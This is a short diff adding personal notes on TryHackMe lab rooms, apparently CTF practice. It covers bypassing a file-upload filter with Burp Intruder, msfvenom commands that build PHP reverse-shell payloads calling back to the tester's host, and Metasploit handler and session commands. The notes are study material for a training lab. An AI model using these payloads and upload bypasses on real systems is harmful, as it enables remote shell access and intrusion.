@@ -48,3 +48,19 @@ https://tryhackme.com/room/linprivesc
 * https://www.revshells.com/
 * TL;DR. Nothing explained to improve the shell worked. Could not run python commands, the shell was crashing. Had to use a web shell to run python commands. The meterpreter didn't work "as expected". The reverse tcp worked but it wasn't a good experience.
 * writeups
+
+--- https://tryhackme.com/room/vulnversity
+
+* Capture a request uploading a file
+* Intruder to test which filetype is not blocked
+* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o mrevshell.phtml`
+  * No one can make it work!!!
+* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o mrevshell_php_rtcp.phtml`
+
+```
+set LHOST tun0
+set PAYLOAD payload/php/meterpreter/reverse_tcp
+exploit -j
+sessions -u 1
+sessions -i 2
+```
